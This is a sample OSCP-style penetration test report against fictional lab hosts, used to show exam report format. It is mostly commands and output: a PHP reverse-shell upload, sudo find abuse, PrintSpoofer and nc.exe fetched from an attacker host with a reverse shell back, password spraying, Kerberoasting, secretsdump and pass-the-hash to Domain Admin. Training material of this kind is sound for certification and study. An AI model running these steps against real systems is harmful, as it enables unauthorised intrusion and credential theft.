# Offensive Security Certified Professional (OSCP) Exam Report — SAMPLE

> **THIS IS A WORKED EXAMPLE** using fictional boxes, to show the expected depth.
> Delete it and use `OSCP-Report-Template.md` for the real exam.

**Student:** Nithish Guru Kumar
**OSID:** OS-XXXXX
**Email:** nithishgurukumar@gmail.com
**Date:** 2026-09-01

---

## 1. Introduction
This report documents the penetration test performed against the OSCP exam
environment. The assessment covered three standalone hosts and one Active
Directory set, all reachable over the exam VPN. Every step below is reproducible
from the commands and output shown.

## 2. Objective
Obtain `local.txt` and `proof.txt` on each in-scope host and document a clear,
repeatable path from initial access to full compromise.

## 3. Requirements / Passing Score
70 points required. Standalones = 20 pts each (10 local + 10 proof). AD set = 40 pts.
All proofs are shown in a screenshot with the machine's IP visible.

---

## 4. High-Level Summary / Points Tally

| Target        | IP            | local.txt | proof.txt | Points |
|---------------|---------------|-----------|-----------|--------|
| AD - MS01     | 192.168.120.40| ✔         | ✔         | (set)  |
| AD - MS02     | 192.168.120.41| —         | ✔         | (set)  |
| AD - DC01     | 192.168.120.5 | —         | ✔         | 40     |
| Standalone-1 (Linux)  | 192.168.130.10 | ✔ | ✔ | 20 |
| Standalone-2 (Windows)| 192.168.130.20 | ✔ | ✔ | 20 |
| **TOTAL**     |               |           |           | **80** |

---

## 5. Standalone Host: Standalone-1 — Linux (192.168.130.10)

### 5.1 Service Enumeration
Full TCP sweep then a version/script scan of the open ports (via `recon.sh`):

```
$ nmap -p- --min-rate 2000 -Pn 192.168.130.10
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

$ nmap -sVC -p22,80 -Pn 192.168.130.10
22/tcp open  ssh     OpenSSH 8.4p1 Debian
80/tcp open  http    Apache httpd 2.4.54
|_http-title: Simple File Manager v1.2
```

Directory brute force revealed an upload endpoint:

```
$ feroxbuster -u http://192.168.130.10 -w .../raft-medium-directories.txt
200  GET  /upload
200  GET  /uploads
```

### 5.2 Initial Access / Foothold
**Vulnerability:** Unrestricted file upload → PHP web shell.
**Description:** `/upload` accepts `.phtml` files, which Apache executes as PHP.
The extension filter only blocked `.php`.

_Steps:_
1. Craft a PHP reverse shell (`revshells.com`, PentestMonkey), save as `sh.phtml`.
2. Upload it via the form and browse to it while a listener runs.

```
$ ./scripts/listener.sh 443
$ curl -F 'file=@sh.phtml' http://192.168.130.10/upload
$ curl http://192.168.130.10/uploads/sh.phtml
# listener:
connect to [192.168.49.130] from (UNKNOWN) [192.168.130.10] 41008
www-data@standalone1:/var/www/html$
```
📸 *[SCREENSHOT: reverse shell as www-data]*

Stabilised the shell and read the user flag:
```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@standalone1:/$ cat /home/mark/local.txt; ip -4 a | grep inet
7b2c4e9a1f6d8b3c0a5e2f9d4c7b1a6e
    inet 192.168.130.10/24 ...
```
📸 *[SCREENSHOT: local.txt with IP visible]*

### 5.3 Privilege Escalation
**Vulnerability:** Misconfigured `sudo` — `mark` may run `/usr/bin/find` as root.
**Description:** `linpeas.sh` flagged a passwordless sudo entry.

_Steps:_
1. Reused a password found in the app config (`db_pass=W3lc0me!`) to `su mark`.
2. `sudo -l` showed `(root) NOPASSWD: /usr/bin/find`.
3. Abused `find` per GTFOBins to spawn a root shell.

```
mark@standalone1:~$ sudo -l
    (root) NOPASSWD: /usr/bin/find
mark@standalone1:~$ sudo find . -exec /bin/bash -p \; -quit
root@standalone1:/home/mark# cat /root/proof.txt; hostname; ip -4 a | grep inet
c1e0f7a2b9d63845e1c7a0b4f2d95e8a
standalone1
    inet 192.168.130.10/24 ...
```
📸 *[SCREENSHOT: proof.txt with IP + hostname visible]*

---

## 6. Standalone Host: Standalone-2 — Windows (192.168.130.20)

### 6.1 Service Enumeration
```
$ nmap -sVC -p- --min-rate 2000 -Pn 192.168.130.20
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2019
3389/tcp open  ms-wbt-server
5985/tcp open  wsman         (WinRM)
```
Null session enumerated a readable share:
```
$ netexec smb 192.168.130.20 -u '' -p '' --shares
SHARE      PERMISSIONS   Backups   READ
$ smbclient //192.168.130.20/Backups -N
smb> get creds.xml
```
`creds.xml` held a PSCredential; decoded to `svc_web : Autumn2023!`.

### 6.2 Initial Access / Foothold
**Vulnerability:** Recovered service-account credentials + exposed WinRM.
```
$ netexec winrm 192.168.130.20 -u svc_web -p 'Autumn2023!'
WINRM  ... [+] svc_web:Autumn2023! (Pwn3d!)
$ evil-winrm -i 192.168.130.20 -u svc_web -p 'Autumn2023!'
*Evil-WinRM* PS> type ..\Desktop\local.txt; ipconfig
9f3b1d7c2a5e8046b3c9f1a7d2e64c0b
   IPv4 Address. . . : 192.168.130.20
```
📸 *[SCREENSHOT: local.txt with IP visible]*

### 6.3 Privilege Escalation
**Vulnerability:** `SeImpersonatePrivilege` enabled → PrintSpoofer.
```
*Evil-WinRM* PS> whoami /priv
SeImpersonatePrivilege   Enabled
# staged from Kali serve/:
PS> iwr http://192.168.49.130/windows/PrintSpoofer64.exe -o ps.exe
PS> iwr http://192.168.49.130/windows/nc.exe -o nc.exe
PS> .\ps.exe -c "c:\users\svc_web\desktop\nc.exe 192.168.49.130 445 -e cmd"
# listener:
C:\Windows\system32> whoami & type C:\Users\Administrator\Desktop\proof.txt & ipconfig
nt authority\system
4a8c0e2f9b1d7635c0a4e8f2b9d16c3a
   IPv4 Address. . . : 192.168.130.20
```
📸 *[SCREENSHOT: SYSTEM shell, proof.txt with IP visible]*

---

## 7. Active Directory Set (192.168.120.0/24)

### 7.1 Enumeration & Initial Foothold — MS01 (192.168.120.40)
Mapped the set and ran the AD fast-path:
```
$ ./scripts/gen-hosts.sh -r 192.168.120.0/24 -x 192.168.49.120
   192.168.120.5   192.168.120.40   192.168.120.41
$ ./scripts/ad-fastpath.sh -d corp.local -i 192.168.120.5
```
Kerbrute enumerated valid users; a password spray of `Welcome1` landed:
```
$ netexec smb 192.168.120.40 -u users.txt -p 'Welcome1' --continue-on-success
[+] corp.local\jbrown:Welcome1
```
Used the creds over WinRM for the foothold and MS01 user flag:
```
$ evil-winrm -i 192.168.120.40 -u jbrown -p Welcome1
PS> type ..\Desktop\local.txt; ipconfig    # d3f0...  192.168.120.40
```
📸 *[SCREENSHOT: MS01 local.txt with IP]*

### 7.2 Domain Enumeration & Kerberoasting
```
$ ./scripts/ad-fastpath.sh -d corp.local -i 192.168.120.5 -u jbrown -p Welcome1 -b -c
[*] Kerberoasting (GetUserSPNs -request)
   $krb5tgs$23$*svc_sql*...   -> kerberoast_hashes.txt
[*] hashcat -m 13100 ...
   svc_sql:SQL$erver2019
```
BloodHound (collected with `-b`) showed `svc_sql` is a local admin on MS02.

### 7.3 Lateral Movement — MS02 (192.168.120.41)
```
$ netexec smb 192.168.120.41 -u svc_sql -p 'SQL$erver2019'
   [+] (Pwn3d!)
$ impacket-psexec corp.local/svc_sql:'SQL$erver2019'@192.168.120.41
C:\> type C:\Users\Administrator\Desktop\proof.txt & ipconfig   # 8b1e...  192.168.120.41
```
📸 *[SCREENSHOT: MS02 proof.txt with IP]*

Dumped local secrets and recovered a Domain Admin's cached NT hash:
```
$ ./scripts/ad-secretsdump.sh -t 192.168.120.41 -d corp.local -u svc_sql -p 'SQL$erver2019'
   [+] Administrator (domain)  ... -> nt_hashes.txt
   corp.local\dadmin:5f4dcc3b5aa765d61d8327deb882cf99
```

### 7.4 Domain Compromise — DC01 (192.168.120.5)
Used the Domain Admin hash for a DCSync against the DC and grabbed proof:
```
$ ./scripts/ad-secretsdump.sh -t 192.168.120.5 -d corp.local -u dadmin \
      -H 5f4dcc3b5aa765d61d8327deb882cf99
   [+] krbtgt:... (golden ticket material)
$ evil-winrm -i 192.168.120.5 -u dadmin -H 5f4dcc3b5aa765d61d8327deb882cf99
PS> type C:\Users\Administrator\Desktop\proof.txt; ipconfig   # 2c7a...  192.168.120.5
```
📸 *[SCREENSHOT: DC01 proof.txt with IP — Domain Admin achieved]*

---

## 8. Appendix — Tools & Notes
- Recon/AD automation: `recon.sh`, `ad-fastpath.sh`, `ad-secretsdump.sh`, `gen-hosts.sh`.
- Transfer/privesc kit served from Kali `serve/` (linpeas, winPEAS, PrintSpoofer, nc.exe, chisel).
- All hashes cracked with `hashcat` + `rockyou.txt`.
